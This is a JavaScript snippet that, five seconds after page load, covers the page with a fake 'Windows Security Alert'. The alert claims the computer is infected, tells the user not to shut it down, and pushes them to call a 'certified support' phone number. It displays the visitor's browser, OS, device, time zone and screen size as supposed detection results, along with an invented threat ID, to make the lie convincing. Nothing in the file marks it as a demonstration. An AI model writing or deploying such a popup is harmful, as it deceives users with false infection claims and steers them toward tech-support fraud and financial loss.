(function () {
  const POPUP_ID = "scamalert-recipe-warning-popup";
  const DELAY_MS = 5000;
  const PHONE_NUMBER = "770-757-9405";

  function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Edg/")) return "Microsoft Edge";
    if (ua.includes("Chrome/") && !ua.includes("Chromium")) return "Google Chrome";
    if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
    if (ua.includes("Firefox/")) return "Firefox";
    return "Your browser";
  }

  function detectOperatingSystem() {
    const platform = navigator.platform || "";
    const ua = navigator.userAgent;
    if (/Mac/.test(platform)) return "macOS";
    if (/Win/.test(platform)) return "Windows";
    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
    if (/Android/.test(ua)) return "Android";
    return "Unknown";
  }

  function detectDeviceType() {
    const ua = navigator.userAgent;
    if (/iPhone|Android.+Mobile/.test(ua)) return "Phone";
    if (/iPad|Tablet|Android/.test(ua)) return "Tablet";
    return "Desktop or laptop";
  }

  function metadataRows() {
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Local time";
    const language = navigator.language || "English";
    const screenSize = `${screen.width} x ${screen.height}`;
    const site = location.hostname || "Current website";
    const os = detectOperatingSystem();

    return [
      ["Browser", detectBrowser()],
      ["Device", detectDeviceType()],
      ["System", os],
      ["Current site", site],
      ["Language", language],
      ["Time zone", timezone],
      ["Screen", screenSize]
    ].map(([label, value]) => `
      <div style="display:flex;justify-content:space-between;gap:16px;border-bottom:1px solid #fee2e2;padding:7px 0;">
        <span style="color:#7f1d1d;font-weight:700;">${label}</span>
        <span style="color:#111827;text-align:right;">${value}</span>
      </div>
    `).join("");
  }

  function showPopup() {
    if (document.getElementById(POPUP_ID)) return;

    const overlay = document.createElement("div");
    overlay.id = POPUP_ID;
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");
    overlay.style.cssText = [
      "position:fixed",
      "inset:0",
      "z-index:2147483647",
      "background:rgba(0,0,0,0.74)",
      "display:flex",
      "align-items:center",
      "justify-content:center",
      "padding:24px",
      "font-family:Arial,Helvetica,sans-serif"
    ].join(";");

    overlay.innerHTML = `
      <div style="
        width:min(720px, 96vw);
        background:#fff;
        color:#111827;
        border:4px solid #b91c1c;
        box-shadow:0 26px 80px rgba(0,0,0,0.55);
      ">
        <div style="
          background:#b91c1c;
          color:#fff;
          padding:16px 20px;
          display:flex;
          align-items:center;
          justify-content:space-between;
          gap:16px;
        ">
          <div style="font-size:23px;font-weight:800;letter-spacing:0.01em;">Windows Security Alert</div>
          <button type="button" id="scamalert-recipe-close" style="
            border:1px solid rgba(255,255,255,0.6);
            background:transparent;
            color:#fff;
            width:32px;
            height:32px;
            font-size:22px;
            line-height:28px;
            cursor:pointer;
          " aria-label="Close warning">x</button>
        </div>

        <div style="padding:30px 34px 34px;">
          <div style="
            display:flex;
            gap:22px;
            align-items:flex-start;
            margin-bottom:24px;
          ">
            <div style="
              width:64px;
              height:64px;
              flex:0 0 auto;
              border-radius:50%;
              background:#fee2e2;
              color:#b91c1c;
              display:grid;
              place-items:center;
              font-size:44px;
              font-weight:900;
            ">!</div>
            <div>
              <h1 style="font-size:31px;line-height:1.12;margin:0 0 10px;color:#111827;">
                Your computer has been infected
              </h1>
              <p style="font-size:18px;line-height:1.5;margin:0;color:#374151;">
                Suspicious activity has been detected on this device. Personal files,
                passwords, and banking information may be at risk.
              </p>
            </div>
          </div>

          <div style="
            background:#fef2f2;
            border:1px solid #fecaca;
            padding:18px;
            margin-bottom:18px;
            font-size:16px;
            line-height:1.55;
            color:#7f1d1d;
          ">
            Do not shut down or restart this computer. Call certified support immediately
            to remove the threat and secure your device.
          </div>

          <div style="
            border:1px solid #fecaca;
            background:#fffafa;
            padding:15px 18px;
            margin-bottom:24px;
            font-size:14px;
            line-height:1.35;
          ">
            <div style="font-size:15px;font-weight:900;color:#991b1b;margin-bottom:7px;text-transform:uppercase;letter-spacing:0.04em;">
              Detected device information
            </div>
            ${metadataRows()}
          </div>

          <div style="
            text-align:center;
            border:2px solid #b91c1c;
            padding:22px;
            background:#fff7f7;
          ">
            <div style="font-size:15px;font-weight:800;text-transform:uppercase;letter-spacing:0.08em;color:#7f1d1d;margin-bottom:8px;">
              Call support now
            </div>
            <div style="font-size:44px;line-height:1;font-weight:900;color:#b91c1c;">
              ${PHONE_NUMBER}
            </div>
          </div>

          <div style="
            margin-top:18px;
            display:flex;
            justify-content:space-between;
            gap:14px;
            color:#6b7280;
            font-size:13px;
          ">
            <span>Threat ID: NK-58291</span>
            <span>Status: Action required</span>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);
    document.getElementById("scamalert-recipe-close").addEventListener("click", () => {
      overlay.remove();
    });
  }

  window.setTimeout(showPopup, DELAY_MS);
})();
